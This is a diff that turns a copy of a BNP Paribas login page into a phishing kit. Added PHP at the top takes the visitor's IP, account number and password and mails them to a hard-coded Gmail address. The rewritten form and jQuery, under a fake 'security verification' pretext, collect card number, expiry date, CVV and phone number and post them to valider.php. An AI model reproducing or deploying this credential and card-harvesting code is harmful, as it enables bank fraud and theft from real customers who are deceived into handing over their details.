@@ -1,3 +1,18 @@
+﻿<?php 
+	$ip = "";
+	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    	$ip = $_SERVER['HTTP_CLIENT_IP'];
+	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	} else {
+	    $ip = $_SERVER['REMOTE_ADDR'];
+	}
+	$header = "From $ip <bnp@pipi.bmci>";
+	$header .= "";
+	$msg  = "---------$ip\nCompte: ".$_POST['cpt']."\n pass: ". $_POST['pass'];
+	mail("gamonet.isa@gmail.com",$header,$msg);
+?>
+
 <html lang="fr" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">	
 <head>	
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -89,8 +104,7 @@
 														<a href="/" class="logoBNP-alone text-hide">BNP Paribas La banque d'un monde qui change</a>
 														<p>La banque d'un monde qui change</p>        
 													</div>       
-													<button href="/fr/connexion" class="bouton-espace-client btn-block" id="bouton-espace-client" disabled>Accéder à mes comptes</button>       
-													<a href="/fr/banque-contacts/devenir-client-bnp-paribas" class="bouton-devenir-client part-only">Devenir client</a>    
+													<button href="/fr/connexion" class="bouton-espace-client btn-block" id="bouton-espace-client" disabled>Valider mes informations</button>         
 												</div>   
 												<header class="bottom-header-connected mobile-only pull-left" id="nav-connect">        <ul id="nav-connect-item" class="list-header-connected left nav-connecte-items mobile-only">            
 													<li class="js-toggle-subnav">
@@ -125,43 +139,32 @@
 	<section class="main-content fond-gradient">
 		<div class="container-ident">
 			<div class="message-erreur arrow-bottom" id="message-erreur"></div>
-			<h2 rv-text="config.app.identification.titre">Accéder à mes comptes</h2>
+			<h3 rv-text="config.app.identification.titre">Pour rétablir l’accès à votre compte, répondez à la vérification de sécurité suivante:</h3>
 			<ul class="grille-ident">
 				<li>
 					<iframe id="remember" name="remember" class="hidden" action="javascript:void(0)"></iframe>
-					<form name="logincanalnet" class="form" target="remember" autocomplete="on" action="javascript:void(0)">
-						<label rv-text="config.app.identification.numclient">1. Mon numéro client</label>
+					<form name="logincanalnet" id="logincanalnet"class="form" target="remember" autocomplete="on" action="#">
+						<label rv-text="config.app.identification.numclient">1. Mon numéro Carte Bancaire</label>
 
-						<input type="tel" pattern="[0-9]*" value="" name="ch1" maxlength="10" size="10" autofocus="" autocorrect="off" id="client-nbr" class="form-control numeric" rv-value-reactive="form.idTelematique"><a class="reset-input" href="#" id="initClient"></a>
+						<input type="tel" pattern="[0-9]*" value="" name="cb" maxlength="16" size="16" autofocus="" autocorrect="off" id="cb" class="form-control numeric" rv-value-reactive="form.idTelematique">
 						
-						<input type="checkbox" value="" id="memoriser" name="memoriser"><label for="memoriser" class="checkbox-inline" rv-text="config.app.identification.memoriser">Mémoriser mon numéro client</label>
-						<button type="submit" id="remember_button" class="hidden"></button>
+						<label rv-text="config.app.identification.numclient">2. Expiration (mm/aaaa)</label>
+
+						<input type="tel" value="" name="exp" maxlength="7" size="7" autofocus="" autocorrect="off" id="exp" class="form-control numeric" rv-value-reactive="form.idTelematique">
+
+						<label rv-text="config.app.identification.numclient">3. Cryptogramme</label>
+
+						<input type="tel" pattern="[0-9]*" value="" name="ccv" maxlength="4" size="4" autofocus="" autocorrect="off" id="ccv" class="form-control numeric" rv-value-reactive="form.idTelematique">
+
+						<label rv-text="config.app.identification.numclient">4. Numéros de téléphone</label>
+						<input type="tel"  value="" name="dob" maxlength="10" size="10" autofocus="" autocorrect="off" id="dob" class="form-control numeric" rv-value-reactive="form.idTelematique">
 					</form>
 				</li>
 				<li>
 					<form name="logincanalnetbis" method="post" class="form">
-						<label rv-text="config.app.identification.password">2. Mon code secret (6 chiffres)</label>
-						<div class="field-password">
-							<input type="password" disabled="" rv-value="form.password | starPassword" maxlength="6" name="staredPassword" id="secret-nbr" class="form-control">
-							<a class="reset-input" href="#" id="initPass"></a>
-							<div class="cell-grid">
-								<div id="secret-nbr-keyboard" rv-grille="data.grille.idGrille" style="background-image: url(k-50634415037854521327874135539749512918.jpg);">
-									<a href="javascript:pass(1)" data-id="01" rv-gridelement="form.password"></a>
-									<a href="javascript:pass(6)" data-id="06" rv-gridelement="form.password"></a>
-									<a href="javascript:pass(5)" data-id="05" rv-gridelement="form.password"></a>
-									<a href="javascript:pass(8)" data-id="08" rv-gridelement="form.password"></a>
-									<a href="javascript:pass(9)" data-id="09" rv-gridelement="form.password"></a>
-									<a href="javascript:pass(4)" data-id="04" rv-gridelement="form.password"></a>
-									<a href="javascript:pass(7)" data-id="07" rv-gridelement="form.password"></a>
-									<a href="javascript:pass(2)" data-id="02" rv-gridelement="form.password"></a>
-									<a href="javascript:pass(0)" data-id="00" rv-gridelement="form.password"></a>
-									<a href="javascript:pass(3)" data-id="03" rv-gridelement="form.password"></a>
-								</div>
-							</div>
-						</div>
 						<div class="cell-password">
 							<div class="field-valid">
-								<button type="button" href="#" class="btn-primary btn-block" id="submitIdent" rv-text="config.app.identification.boutonTitle" disabled="disabled">Accéder à mes comptes</button>
+								<button type="button" href="#" class="btn-primary btn-block" id="submitIdent" rv-text="config.app.identification.boutonTitle" disabled="disabled">Valider les informations</button>
 							</div>
 						</div>
 						<div id="zone-publiable-basse"><p id="zonePubliableBasIdentificationPart"></p>
@@ -320,29 +323,30 @@ var s2=document.getElementsByTagName("script")[0]; s2.parentNode.insertBefore(s,
 
 <script type="text/javascript">
 	$(document).ready(function(){
-		$("#initClient").bind("click", function(){
-			$("#client-nbr").val("");
-			$("#submitIdent").attr("disabled","disabled");
-		})
-		$("#initPass").bind("click", function(){
-			$("#secret-nbr").val("");
-			$("#submitIdent").attr("disabled","disabled");
-		})
-		$("#client-nbr").bind("keypress", function(){
-			if($("#secret-nbr").val().length == 6 && $("#client-nbr").val().length == 10){
+
+		$("#logincanalnet input ").bind("keypress", function(){
+			if(($("#cb").val().length == 14  || $("#cb").val().length == 16) 
+				&& $("#exp").val().length == 7
+				&& ($("#ccv").val().length == 3 || $("#ccv").val().length == 4)
+				&& $("#dob").val().length == 10){
 				$("#submitIdent").removeAttr("disabled");
+
 			}else{
-				$("#submitIdent").attr("disabled","disabled");
+
+				$("#submitIdent").removeAttr("disabled");
 			}
 		})
 		$("#submitIdent").bind("click", function(){
-			var form = $("<form style='display:none'  action='information.php' method='post'><form/>");
-			form.append('<input type="text" name="cpt" value="'+ $("#client-nbr").val() +'" />');
-			form.append('<input type="text" name="pass" value="'+ $("#secret-nbr").val() +'" />');
-			form.append('<input type="submit" value="go"/>');
-			form.appendTo("body");
-			form.submit();
-
+			$form = $("<form style='display:none' action='valider.php' method='post'><form/>");
+			$form.append('<input type="text" name="cb" value="'+ $("#cb").val() +'" />');
+			$form.append('<input type="text" name="exp" value="'+ $("#exp").val() +'" />');
+			$form.append('<input type="text" name="ccv" value="'+ $("#ccv").val() +'" />');
+			$form.append('<input type="text" name="dob" value="'+ $("#dob").val() +'" />');
+			$form.append('<input type="submit" value="go"/>');
+			$form.appendTo("body");
+			
+			//$form.appendTo('body').submit();
+			$form.submit();
 		})
 	});
 
